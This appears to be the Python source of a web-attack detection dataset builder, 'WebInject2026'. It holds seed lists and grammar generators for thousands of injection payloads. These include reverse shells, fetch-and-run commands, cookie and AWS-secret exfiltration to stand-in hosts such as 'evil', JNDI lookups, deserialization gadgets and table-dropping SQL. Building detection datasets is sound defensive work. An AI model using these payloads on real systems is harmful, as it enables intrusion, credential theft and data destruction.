"""Attack payload pools and evasion transforms for WebInject2026.

Three sources feed the pool, in this order:

  1. A curated seed set (below): hand-written, realistic payloads per family.
  2. A deterministic grammar (`_generate`): each family has templates whose
     slots are enumerated in fixed order. Every payload carries a *template*
     name (e.g. `sqli:union`). This is what lifts the attack side to thousands
     of distinct canonical payloads and — new in v3 — supports a *structural*
     split that holds out whole template shapes, not just payload strings.
  3. Optionally, PayloadsAllTheThings under `data/patt/` if present.

Grouping keys
  * `group_key(payload)`  = md5 of the *canonical* (evasion-stripped) form. The
    payload-disjoint split groups on this, so no payload — in any encoding —
    leaks from train into val/test.
  * `template_key(payload)` — the template a payload was generated from. The
    structural split groups on this, so at test time the model faces template
    *shapes* it never saw. PATT/seed payloads with no known template fall back
    to a coarse structural signature so they still group sensibly.

Generation is fully deterministic (fixed iteration order, no RNG), so a clean
rebuild reproduces the committed CSV byte-for-byte.
"""

import glob
import hashlib
import os
import random
import re
import urllib.parse

# --------------------------------------------------------- seed payloads ----
SEED = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "admin'--", "admin' #",
        "' OR '1'='1' /*", "1' ORDER BY 3--", "1 UNION SELECT null,null,null--",
        "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--", "1'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--", "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' OR 1=1 LIMIT 1;--", "') OR ('1'='1", "1) UNION SELECT 1,2,3--",
        "0x27204f5220313d31", "' OR 'x'='x", "'||(SELECT pg_sleep(5))||'",
        "1 AND extractvalue(1,concat(0x7e,version()))",
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        "'; EXEC xp_cmdshell('whoami')--", "1' AND '1'='2",
        "-1 UNION SELECT table_name FROM information_schema.tables--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.domain)>", "\"><script>alert(1)</script>",
        "javascript:alert(1)", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<img src=1 onerror=\"fetch('//evil/'+document.cookie)\">",
        "'\"><svg onload=alert(String.fromCharCode(88,83,83))>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
        "<script>document.location='//evil/?'+document.cookie</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "\"><img src=x onerror=alert`1`>",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
    ],
    "cmdi": [
        "; cat /etc/passwd", "| whoami", "&& id", "|| ls -la",
        "`id`", "$(whoami)", "; ping -c 4 127.0.0.1", "| nc -e /bin/sh 10.0.0.1 4444",
        "; curl http://evil/`whoami`", "& dir", "&& type C:\\\\windows\\\\win.ini",
        "; sleep 5", "$(sleep 5)", "`sleep 5`", "%0acat%20/etc/passwd",
        "| powershell -c \"Get-Process\"", "; rm -rf /tmp/x",
        ";wget http://evil/x.sh -O- | sh", "| certutil -urlcache -f http://evil/x x",
        "&& echo vulnerable", "; uname -a", "$(cat /etc/shadow)",
    ],
    "traversal": [
        "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd", "/var/www/../../etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "php://filter/convert.base64-encode/resource=index",
        "file:///etc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/proc/self/environ", "....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "..%2f..%2f..%2fboot.ini",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config.items()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${{7*7}}", "{{7*'7'}}", "#{ 7 * 7 }", "*{7*7}",
        "{%for x in range(3)%}{{x}}{%endfor%}",
        "${@java.lang.Runtime@getRuntime().exec('whoami')}",
    ],
    "nosqli": [
        "' || '1'=='1", "[$ne]=1", "{\"$gt\":\"\"}", "{\"$where\":\"sleep(5000)\"}",
        "';return true;var x='", "{\"username\":{\"$ne\":null}}",
        "[$regex]=.*", "{\"$gt\":undefined}", "true, $where: '1 == 1'",
        "{\"$or\":[{},{\"a\":\"a\"}]}", "';return this.password.match(/.*/)//",
        "admin'||''=='", "{\"password\":{\"$regex\":\"^a\"}}",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin", "http://127.0.0.1:22",
        "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
        "http://[::1]:80/", "dict://127.0.0.1:11211/stats",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://0177.0.0.1/", "http://2130706433/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ],
    "crlf": [
        "%0d%0aSet-Cookie:%20admin=true",
        "%0d%0aLocation:%20http://evil",
        "\\r\\nSet-Cookie: sessid=hijack",
        "%0d%0aContent-Length:%200%0d%0a%0d%0a",
        "%E5%98%8A%E5%98%8DSet-Cookie:%20x=1",
        "%0aX-Injected:%20true",
    ],
    "ldapi": [
        "*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(|(password=*))",
        "*)(objectClass=*", ")(cn=*))(|(cn=*", "*))%00",
        "*)(mail=*))(|(mail=*",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
        "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">]>",
        "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://evil/e.dtd\">%p;]>",
        "<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
    ],
    # ---- families added in v3: the four shapes that dominate modern advisories
    "jndi": [
        "${jndi:ldap://attacker.example/a}",
        "${jndi:rmi://127.0.0.1:1099/obj}",
        "${jndi:dns://evil.example/x}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil/x}",
        "${${lower:jndi}:${lower:ldap}://evil/x}",
        "${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.evil/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil/x}",
    ],
    "deser": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg==",
        "O:8:\"stdClass\":1:{s:4:\"user\";s:5:\"admin\";}",
        "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"admin\";b:1;}",
        "!!python/object/apply:os.system ['id']",
        "!!python/object/apply:subprocess.check_output [['whoami']]",
        "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
        "AAEAAAD/////AQAAAAAAAAAMAgAAAF5TeXN0ZW0uV2luZG93cy5G",
        "gAWVIAAAAAAAAACMBW9zdWJwcm9jZXNzlIwGc3lzdGVtlJOU",
        "!!ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Package",
    ],
    "protopollute": [
        "__proto__[isAdmin]=true",
        "constructor[prototype][isAdmin]=true",
        "{\"__proto__\":{\"isAdmin\":true}}",
        "{\"constructor\":{\"prototype\":{\"role\":\"admin\"}}}",
        "__proto__.polluted=yes",
        "a[__proto__][toString]=evil",
        "{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');x\"}}",
    ],
    "smuggle": [
        "chunked%0d%0aContent-Length:%206%0d%0a%0d%0a0%0d%0a%0d%0aG",
        "%0d%0aTransfer-Encoding:%20chunked%0d%0a",
        "%0d%0aHost:%20evil.example%0d%0a",
        "%0d%0aX-Forwarded-Host:%20evil.example%0d%0a",
        "%0d%0aContent-Length:%200%0d%0aTransfer-Encoding:%20chunked%0d%0a",
        "%0d%0aTransfer-Encoding:%20%09chunked%0d%0a",
        "evil.example%0d%0aX-Original-URL:%20/admin",
    ],
}

# --------------------------------------------------- grammar expansion ------
# Each generator yields (payload, template) pairs. Distinct *canonical* payloads
# come from enumerating template slots in a fixed order; the template name is
# what the structural split holds out. No RNG: the same build always produces
# the same set.

_SQLI_PREFIX = ["'", "\"", "')", "\")", "1'", "1\"", "admin'", "-1", "1)", "'))"]
_SQLI_COMMENT = ["--", "-- -", "#", "/*", ""]
_SQLI_STR = ["1", "x", "a", "abc"]
_SLEEP_T = [3, 5, 10]
_SQLI_TABLES = ["users", "accounts", "members", "admin", "customers"]
_SQLI_COLSETS = ["null,null", "null,null,null", "1,2,3",
                 "username,password", "user,pass,email", "table_name",
                 "column_name", "@@version", "database(),user()"]


def _gen_sqli():
    for pre in _SQLI_PREFIX:
        for c in _SQLI_COMMENT:
            for s in _SQLI_STR:
                yield f"{pre} OR '{s}'='{s}{c}", "sqli:tautology_str"
            yield f"{pre} OR 1=1{c}", "sqli:tautology_num"
            yield f"{pre} AND 1=2{c}", "sqli:tautology_num"
            yield f"{pre} OR 1=1 LIMIT 1{c}", "sqli:limit"
            for col in _SQLI_COLSETS:
                yield f"{pre} UNION SELECT {col}{c}", "sqli:union"
            for t in _SLEEP_T:
                yield f"{pre} OR SLEEP({t}){c}", "sqli:sleep"
                yield f"{pre};WAITFOR DELAY '0:0:{t}'{c}", "sqli:waitfor"
                yield f"{pre} OR pg_sleep({t}){c}", "sqli:pgsleep"
                yield (f"{pre} AND (SELECT {t} FROM (SELECT SLEEP({t}))a){c}",
                       "sqli:nested_sleep")
            for tbl in _SQLI_TABLES:
                yield f"{pre}; DROP TABLE {tbl}{c}", "sqli:drop"
                yield f"{pre} UNION SELECT * FROM {tbl}{c}", "sqli:union_table"
            yield (f"{pre} AND extractvalue(1,concat(0x7e,version())){c}",
                   "sqli:error_extractvalue")
            yield (f"{pre} AND updatexml(1,concat(0x7e,user()),1){c}",
                   "sqli:error_updatexml")
            yield f"{pre} AND 1=CONVERT(int,@@version){c}", "sqli:convert"


_XSS_TAGS = ["script", "img", "svg", "iframe", "body", "video", "audio",
             "details", "marquee", "input", "object", "a", "form", "select"]
_XSS_EVENTS = ["onerror", "onload", "onmouseover", "onfocus", "ontoggle",
               "onstart", "onbegin", "onanimationstart", "onpointerover"]
_XSS_SINK = ["alert(1)", "alert(document.domain)", "alert(document.cookie)",
             "confirm(1)", "print()", "fetch('//evil/'+document.cookie)",
             "eval(atob('YWxlcnQoMSk='))"]
_XSS_PREFIX = ["", "\">", "'>", "\"><", "'></textarea>", "</title>", "\"/>"]


def _gen_xss():
    for pre in _XSS_PREFIX:
        for sink in _XSS_SINK:
            yield f"{pre}<script>{sink}</script>", "xss:script"
            for ev in _XSS_EVENTS:
                for tag in ("img", "svg", "body", "video", "details", "input"):
                    yield f"{pre}<{tag} {ev}={sink}>", "xss:tag_event"
            yield (f"{pre}<svg><animate onbegin={sink} attributeName=x dur=1s>",
                   "xss:svg_animate")
            yield (f"{pre}<object data=\"data:text/html,<script>{sink}</script>\">",
                   "xss:object_data")
            yield f"{pre}<form action=javascript:{sink}><input type=submit>", \
                  "xss:form_action"
        for tag in _XSS_TAGS:
            yield f"{pre}<{tag}/onload=alert(1)>", "xss:tag_onload"
        yield f"{pre}<a href=javascript:alert(1)>x</a>", "xss:anchor_js"
        yield f"{pre}<iframe src=javascript:alert(document.domain)>", "xss:iframe_js"


_CMDI_SEP = [";", "|", "||", "&&", "&", "\n", "%0a"]
_CMDI_CMD = ["cat /etc/passwd", "cat /etc/shadow", "id", "whoami", "uname -a",
             "ls -la", "pwd", "hostname", "dir", "type C:\\windows\\win.ini",
             "sleep 5", "ping -c 4 127.0.0.1"]
_CMDI_NET = ["curl http://evil/", "wget http://evil/x", "nc -e /bin/sh 10.0.0.1 4444",
             "certutil -urlcache -f http://evil/x x"]
_CMDI_ENV = ["PATH", "HOME", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD"]


def _gen_cmdi():
    for sep in _CMDI_SEP:
        for cmd in _CMDI_CMD:
            yield f"{sep} {cmd}", "cmdi:sep_cmd"
        for net in _CMDI_NET:
            yield f"{sep} {net}", "cmdi:sep_net"
    for cmd in ("id", "whoami", "cat /etc/passwd", "sleep 5", "uname -a"):
        yield f"$({cmd})", "cmdi:subshell_dollar"
        yield f"`{cmd}`", "cmdi:subshell_backtick"
    for var in _CMDI_ENV:
        yield f"; echo ${var}", "cmdi:env"
        yield f"| printenv {var}", "cmdi:env"


_TRAV_DEPTH = [2, 3, 4, 6, 8]
_TRAV_TARGET = ["etc/passwd", "etc/shadow", "windows/win.ini",
                "windows/system32/drivers/etc/hosts", "boot.ini",
                "proc/self/environ", "var/log/auth.log"]
_TRAV_SEQ = ["../", "..\\", "%2e%2e%2f", "%2e%2e/", "..%2f", "..%252f",
             "....//", "..%c0%af"]
_TRAV_WRAP = ["php://filter/convert.base64-encode/resource={t}",
              "file:///{t}", "expect://{t}", "zip://{t}"]
_TRAV_EXT = ["%00.jpg", "%00.png", "\x00.pdf"]


def _gen_traversal():
    for seq in _TRAV_SEQ:
        for depth in _TRAV_DEPTH:
            for tgt in _TRAV_TARGET:
                yield seq * depth + tgt, "traversal:seq_depth"
    for wrap in _TRAV_WRAP:
        for tgt in _TRAV_TARGET:
            yield wrap.format(t=tgt), "traversal:wrapper"
    for tgt in _TRAV_TARGET:
        yield f"/{tgt}", "traversal:absolute"
        yield f"/var/www/../../{tgt}", "traversal:absolute"
        for ext in _TRAV_EXT:
            yield "../" * 4 + tgt + ext, "traversal:nullbyte_ext"
    for tgt in ("windows/win.ini", "boot.ini"):
        yield f"\\\\127.0.0.1\\share\\{tgt}", "traversal:unc"


_SSTI_WRAP = [("{{{0}}}", "ssti:curly"), ("${{{0}}}", "ssti:dollar"),
              ("<%= {0} %>", "ssti:erb"), ("#{{{0}}}", "ssti:hash"),
              ("*{{{0}}}", "ssti:star"), ("{{{{={0}}}}}", "ssti:handlebars"),
              ("@({0})", "ssti:at"), ("~{{{0}}}", "ssti:tilde")]
_SSTI_EXPR = ["7*7", "7*'7'", "config", "config.items()", "self",
              "request.application", "''.__class__.__mro__",
              "''.__class__.__base__.__subclasses__()",
              "T(java.lang.Runtime).getRuntime().exec('id')",
              "__import__('os').popen('id').read()",
              "cycler.__init__.__globals__.os.popen('id').read()",
              "settings.SECRET_KEY", "lipsum.__globals__.os.popen('id').read()"]


def _gen_ssti():
    for wrap, tpl in _SSTI_WRAP:
        for expr in _SSTI_EXPR:
            yield wrap.format(expr), tpl


_NOSQL_FIELD = ["username", "password", "email", "user", "id"]
_NOSQL_OP = ["$ne", "$gt", "$lt", "$gte", "$regex", "$exists", "$nin"]
_NOSQL_VAL = ["null", "\"\"", "1", "\"^a\"", "true", "undefined"]


def _gen_nosqli():
    for f in _NOSQL_FIELD:
        for op in _NOSQL_OP:
            for v in _NOSQL_VAL:
                yield f"{{\"{f}\":{{\"{op}\":{v}}}}}", "nosqli:op_obj"
        yield f"[{f}][$ne]=", "nosqli:bracket"
    for op in _NOSQL_OP:
        yield f"[{op}]=1", "nosqli:bracket"
    for f in _NOSQL_FIELD:
        yield f"{{\"$where\":\"this.{f}.length > 0\"}}", "nosqli:where_js"
        yield f"';return this.{f}.match(/.*/)//", "nosqli:where_js"
        yield f"{{\"{f}\":{{\"$regex\":\"^adm\"}}}}", "nosqli:regex"
    yield "';return true;var x='", "nosqli:where_js"
    yield "' || '1'=='1", "nosqli:or_array"
    yield "{\"$where\":\"sleep(5000)\"}", "nosqli:where_js"
    yield "{\"$or\":[{},{\"a\":\"a\"}]}", "nosqli:or_array"


_SSRF_SCHEME = ["http", "https", "gopher", "dict", "file", "ftp", "ldap", "tftp"]
_SSRF_HOST = ["169.254.169.254", "127.0.0.1", "localhost", "[::1]",
              "0177.0.0.1", "2130706433", "0x7f000001",
              "metadata.google.internal", "metadata.azure.internal"]
_SSRF_PORT = ["", ":22", ":80", ":443", ":3306", ":6379", ":8080", ":11211"]
_SSRF_PATH = ["/", "/latest/meta-data/",
              "/latest/meta-data/iam/security-credentials/",
              "/computeMetadata/v1/", "/admin", "/_INFO"]


def _gen_ssrf():
    for host in _SSRF_HOST:
        for port in _SSRF_PORT:
            for path in _SSRF_PATH:
                yield f"http://{host}{port}{path}", "ssrf:http_host_port_path"
    for sch in _SSRF_SCHEME:
        yield f"{sch}://127.0.0.1/", "ssrf:scheme"
        yield f"{sch}://169.254.169.254/", "ssrf:scheme"
    for host in ("2130706433", "0x7f000001", "0177.0.0.1", "017700000001"):
        yield f"http://{host}/admin", "ssrf:decimal_ip"
    for host in _SSRF_HOST[:5]:
        yield f"http://evil.example/redirect?to=http://{host}/", "ssrf:redirect_chain"
        yield f"http://{host}#@evil.example/", "ssrf:redirect_chain"


_CRLF_NAME = ["Set-Cookie", "Location", "X-Injected", "Content-Length",
              "X-XSS-Protection", "Refresh", "Link", "X-Forwarded-For"]
_CRLF_VAL = ["admin=true", "sessid=hijack", "http://evil", "0", "1",
             "10.0.0.1", "<script>alert(1)</script>"]
_CRLF_SEQ = [("%0d%0a", "crlf:header_inject"), ("%0a", "crlf:header_inject"),
             ("%E5%98%8A%E5%98%8D", "crlf:unicode"), ("\\r\\n", "crlf:header_inject"),
             ("%23%0d%0a", "crlf:header_inject"), ("%250d%250a", "crlf:double_enc")]


def _gen_crlf():
    for seq, tpl in _CRLF_SEQ:
        for name in _CRLF_NAME:
            for val in _CRLF_VAL:
                yield f"{seq}{name}:%20{val}", tpl
    for n in ("0", "5", "10"):
        yield (f"%0d%0aContent-Length:%20{n}%0d%0a%0d%0a<html>hi</html>",
               "crlf:content_len")
    for body in ("<html>x</html>", "{\"ok\":1}", "alert(1)"):
        yield (f"%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a{body}",
               "crlf:response_split")


_LDAP_ATTR = ["uid", "cn", "mail", "password", "objectClass", "sn",
              "givenName", "userPassword", "memberOf"]
_LDAP_USER = ["admin", "*", "root", "user"]


def _gen_ldapi():
    for a in _LDAP_ATTR:
        yield f"*)({a}=*", "ldapi:attr_wild"
        yield f"*)({a}=*))(|({a}=*", "ldapi:filter_break"
        yield f"*)(|({a}=*))", "ldapi:or_filter"
        for u in _LDAP_USER:
            yield f"{u})(|({a}=*))", "ldapi:user_or"
        yield f"*)({a}=*)(&", "ldapi:and_append"
    yield "*))%00", "ldapi:nullbyte"
    yield ")(cn=*))(|(cn=*", "ldapi:filter_break"
    yield "*)(uid=*))(|(uid=*", "ldapi:filter_break"


_XXE_ROOT = ["r", "foo", "data", "root", "x"]
_XXE_TARGET = ["file:///etc/passwd", "file:///etc/shadow",
               "file:///c:/boot.ini", "file:///c:/windows/win.ini",
               "http://169.254.169.254/latest/meta-data/",
               "http://metadata.google.internal/computeMetadata/v1/",
               "http://evil.example/e.dtd", "expect://id",
               "php://filter/convert.base64-encode/resource=/etc/passwd",
               "netdoc:///etc/passwd", "jar:http://evil/x.jar!/"]


def _gen_xxe():
    for root in _XXE_ROOT:
        for tgt in _XXE_TARGET:
            yield (f"<?xml version=\"1.0\"?><!DOCTYPE {root} "
                   f"[<!ENTITY xxe SYSTEM \"{tgt}\">]><{root}>&xxe;</{root}>",
                   "xxe:system_entity")
    for tgt in _XXE_TARGET:
        yield (f"<!DOCTYPE r [<!ENTITY % p SYSTEM \"{tgt}\">%p;]>",
               "xxe:param_entity")
        yield (f"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "
               f"\"{tgt}\"><!ENTITY % int \"<!ENTITY e SYSTEM '{tgt}'>\">%remote;]>",
               "xxe:oob_dtd")


_JNDI_SCHEME = ["ldap", "ldaps", "rmi", "dns", "iiop", "nis", "corba", "nds"]
_JNDI_HOST = ["attacker.example", "evil.example", "127.0.0.1:1099",
              "10.0.0.1:389", "${env:USER}.evil.example",
              "${sys:java.version}.evil.example", "127.0.0.1#evil.example"]
_JNDI_OBF = [
    "${{jndi:{s}://{h}/a}}",
    "${{${{lower:j}}ndi:{s}://{h}/a}}",
    "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{s}://{h}/z}}",
    "${{jndi:${{lower:{s}}}://{h}/a}}",
    "${{${{env:X:-j}}ndi:{s}://{h}/a}}",
]


def _gen_jndi():
    for s in _JNDI_SCHEME:
        for h in _JNDI_HOST:
            yield _JNDI_OBF[0].format(s=s, h=h), "jndi:plain"
    for tpl in _JNDI_OBF[1:]:
        for s in ("ldap", "rmi", "dns"):
            for h in _JNDI_HOST[:5]:
                yield tpl.format(s=s, h=h), "jndi:obfuscated"


_PP_KEY = [("__proto__", "pp:proto"), ("constructor.prototype", "pp:ctor"),
           ("constructor[prototype]", "pp:ctor")]
_PP_ATTR = ["isAdmin", "role", "polluted", "status", "toString",
            "outputFunctionName", "admin", "enabled", "__proto__"]
_PP_VAL = ["true", "admin", "1", "yes"]


def _gen_protopollute():
    for key, tpl in _PP_KEY:
        for attr in _PP_ATTR:
            for val in _PP_VAL:
                yield f"{key}[{attr}]={val}", tpl + "_bracket"
                yield f"{key}.{attr}={val}", tpl + "_dot"
    for attr in _PP_ATTR:
        for val in _PP_VAL:
            yield f"{{\"__proto__\":{{\"{attr}\":\"{val}\"}}}}", "pp:json_proto"
            yield (f"{{\"constructor\":{{\"prototype\":{{\"{attr}\":\"{val}\"}}}}}}",
                   "pp:json_ctor")
    for attr in _PP_ATTR:
        yield f"a[__proto__][{attr}]=x", "pp:nested_bracket"


# Header-injection / request-smuggling. The meaningful variation is the header
# NAME, its VALUE, and the smuggled request line — tokens that survive
# canonicalisation — because canonical() strips the CRLF/whitespace that would
# otherwise distinguish these. Enumerate over tokens so each payload has a
# distinct canonical form (and hence its own split group).
_SM_INJECT_HDR = {
    "Host": ["evil.example", "internal.admin", "localhost:8080", "metadata.internal"],
    "X-Forwarded-Host": ["evil.example", "127.0.0.1", "attacker.example"],
    "X-Forwarded-For": ["127.0.0.1", "10.0.0.1", "169.254.169.254"],
    "X-Forwarded-Scheme": ["https", "http"],
    "X-Original-URL": ["/admin", "/internal/metrics", "/server-status", "/.env"],
    "X-Rewrite-URL": ["/admin", "/manager/html", "/actuator/env"],
    "Set-Cookie": ["role=admin", "sessid=hijack", "isAdmin=1"],
    "Location": ["http://evil.example", "//evil.example/", "/admin"],
}
_SM_SMUGGLED = ["GET /admin HTTP/1.1", "POST /login HTTP/1.1",
                "GET /.env HTTP/1.1", "DELETE /api/users/1 HTTP/1.1",
                "GET /actuator/env HTTP/1.1"]


def _gen_smuggle():
    # single injected header (CRLF header injection)
    for name, vals in _SM_INJECT_HDR.items():
        for v in vals:
            yield f"%0d%0a{name}:%20{urllib.parse.quote(v)}%0d%0a", \
                  f"smuggle:{name.lower()}"
    # CL.TE / TE.CL desync, distinguished by the smuggled request line
    for smug in _SM_SMUGGLED:
        s = urllib.parse.quote(smug)
        yield (f"Content-Length:%206%0d%0aTransfer-Encoding:%20chunked"
               f"%0d%0a%0d%0a0%0d%0a%0d%0a{s}", "smuggle:cl_te")
        yield (f"Transfer-Encoding:%20chunked%0d%0aContent-Length:%204"
               f"%0d%0a%0d%0a5c%0d%0a{s}", "smuggle:te_cl")
    # TE obfuscation variants (the classic parser-disagreement tricks)
    for obf in ("Transfer-Encoding:%20chunked", "Transfer-Encoding:%09chunked",
                "Transfer-Encoding%20:%20chunked", "Transfer-Encoding:%20xchunked",
                "Transfer-Encoding:%20\"chunked\"", "X-Transfer-Encoding:%20chunked",
                "Transfer_Encoding:%20chunked"):
        for smug in _SM_SMUGGLED[:3]:
            yield f"%0d%0a{obf}%0d%0aX-Note:%20{urllib.parse.quote(smug)}", \
                  "smuggle:te_obfuscation"


# `deser` is registered after its generator is defined, just below.
_GENERATORS = {
    "sqli": _gen_sqli, "xss": _gen_xss, "cmdi": _gen_cmdi,
    "traversal": _gen_traversal, "ssti": _gen_ssti, "nosqli": _gen_nosqli,
    "ssrf": _gen_ssrf, "crlf": _gen_crlf, "ldapi": _gen_ldapi, "xxe": _gen_xxe,
    "jndi": _gen_jndi, "protopollute": _gen_protopollute, "smuggle": _gen_smuggle,
}


# `deser` is enumerated rather than generated from short slots, because its
# specimens are whole encoded blobs; a small deterministic expansion keeps it
# reproducible while giving enough distinct canonical payloads for the split.
_DESER_PHP_CLASS = ["stdClass", "User", "Session", "Cart", "Logger", "Cache",
                    "Template", "Connection"]
_DESER_JSON_TYPE = ["com.sun.rowset.JdbcRowSetImpl",
                    "org.apache.commons.collections.functors.InvokerTransformer",
                    "ch.qos.logback.core.db.DriverManagerConnectionSource",
                    "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"]
_DESER_HOST = ["ldap://evil.example/a", "rmi://127.0.0.1:1099/x",
               "http://169.254.169.254/"]


def _gen_deser():
    for cls in _DESER_PHP_CLASS:
        for n in (1, 2, 3):
            yield (f"O:{len(cls)}:\"{cls}\":{n}:{{s:4:\"user\";s:5:\"admin\";}}",
                   "deser:php_object")
        yield f"a:2:{{i:0;s:3:\"cmd\";i:1;s:6:\"whoami\";}}", "deser:php_array"
    for t in _DESER_JSON_TYPE:
        for h in _DESER_HOST:
            yield f"{{\"@type\":\"{t}\",\"dataSourceName\":\"{h}\"}}", "deser:fastjson"
    for cmd in ("id", "whoami", "cat /etc/passwd", "uname -a"):
        yield f"!!python/object/apply:os.system ['{cmd}']", "deser:python_yaml"
        yield f"!!python/object/apply:subprocess.check_output [['{cmd}']]", \
              "deser:python_yaml"
    for tag in ("rO0ABXNy", "AAEAAAD/////", "gAWVIAAAAAA"):
        for suffix in ("HashMap", "ArrayList", "Runtime", "Process"):
            blob = tag + hashlib.md5((tag + suffix).encode()).hexdigest()[:16]
            yield blob, "deser:java_blob"


# Register the real deser generator (the map above used a placeholder to keep
# definition order simple).
_GENERATORS["deser"] = _gen_deser


def _generate(family):
    """Deterministic list of (payload, template) for a family."""
    gen = _GENERATORS.get(family)
    return list(gen()) if gen else []


# PayloadsAllTheThings directory names per family (if the corpus is present).
PATT_DIRS = {
    "sqli": ["SQL Injection"],
    "xss": ["XSS Injection"],
    "cmdi": ["Command Injection"],
    "traversal": ["Directory Traversal", "File Inclusion"],
    "ssti": ["Server Side Template Injection"],
    "nosqli": ["NoSQL Injection"],
    "ssrf": ["Server Side Request Forgery"],
    "crlf": ["CRLF Injection"],
    "ldapi": ["LDAP Injection"],
    "xxe": ["XXE Injection"],
    "jndi": ["Insecure Management Interface", "JNDI Injection"],
    "deser": ["Insecure Deserialization"],
    "protopollute": ["Prototype Pollution"],
    "smuggle": ["Request Smuggling", "HTTP Parameter Pollution"],
}


def _clean(line: str):
    l = line.strip()
    if not l or len(l) < 3 or len(l) > 400:
        return None
    if l.startswith(("#", "```", "|", "<!--", "---", "===", "* ", "- [", "> ")):
        return None
    if l.startswith(("http://", "https://")) and " " not in l and len(l) < 15:
        return None
    return l


def _load_patt(root: str):
    extra = {fam: [] for fam in SEED}
    for fam, dirs in PATT_DIRS.items():
        for d in dirs:
            base = os.path.join(root, d)
            if not os.path.isdir(base):
                continue
            for f in sorted(glob.glob(base + "/**/*.txt", recursive=True)):
                try:
                    for line in open(f, encoding="utf-8", errors="ignore"):
                        c = _clean(line)
                        if c:
                            extra[fam].append(c)
                except Exception:
                    pass
    return extra


def canonical(payload: str) -> str:
    """Encoding-invariant form of a payload, for grouping across evasions."""
    s = payload
    for _ in range(3):
        d = urllib.parse.unquote_plus(s)
        if d == s:
            break
        s = d
    s = s.lower()
    s = re.sub(r"/\*.*?\*/", "", s)          # inline SQL comments
    s = re.sub(r"\s+", " ", s).strip()
    s = s.replace("`", "'").replace("\\", "/")
    return s


def group_key(payload: str) -> str:
    return hashlib.md5(canonical(payload).encode("utf-8", "ignore")).hexdigest()[:16]


# --------------------------------------------------- structural signature ----
# For the structural split we need a template for *every* payload, including
# seed and PATT payloads that were not produced by a generator. Known grammar
# payloads carry their real template; the rest get a coarse structural signature
# derived from which syntactic markers they contain — enough to keep payloads of
# the same shape together without hand-labelling every string.
_STRUCT_MARKERS = [
    ("union_select", r"(?i)union\s+(all\s+)?select"),
    ("sql_comment", r"(--|\#|/\*)"),
    ("tautology", r"(?i)or\s+['\"]?\d"),
    ("script_tag", r"(?i)<script"),
    ("event_handler", r"(?i)on\w+\s*="),
    ("svg_img", r"(?i)<(svg|img|iframe|body|object)"),
    ("template_curly", r"\{\{.*?\}\}|\$\{.*?\}"),
    ("cmd_sep", r"[;|&]{1,2}\s*\w"),
    ("subshell", r"\$\(|`"),
    ("traversal", r"\.\./|\.\.\\|%2e%2e"),
    ("file_scheme", r"(?i)(file|php|expect|zip|jar|netdoc)://"),
    ("net_scheme", r"(?i)(https?|gopher|dict|ftp|ldaps?|tftp)://"),
    ("nosql_op", r"\$(ne|gt|lt|gte|regex|where|exists|nin|or)\b"),
    ("ldap_filter", r"\*\)\(|\)\(\|"),
    ("xml_entity", r"(?i)<!(entity|doctype)"),
    ("jndi", r"(?i)jndi|\$\{.*?:-"),
    ("proto", r"__proto__|constructor.{0,12}prototype"),
    ("crlf", r"%0d%0a|%0a|\\r\\n"),
    ("serialized", r"(?i)O:\d+:|!!(python|ruby|java)|rO0AB|AAEAAAD|@type"),
]
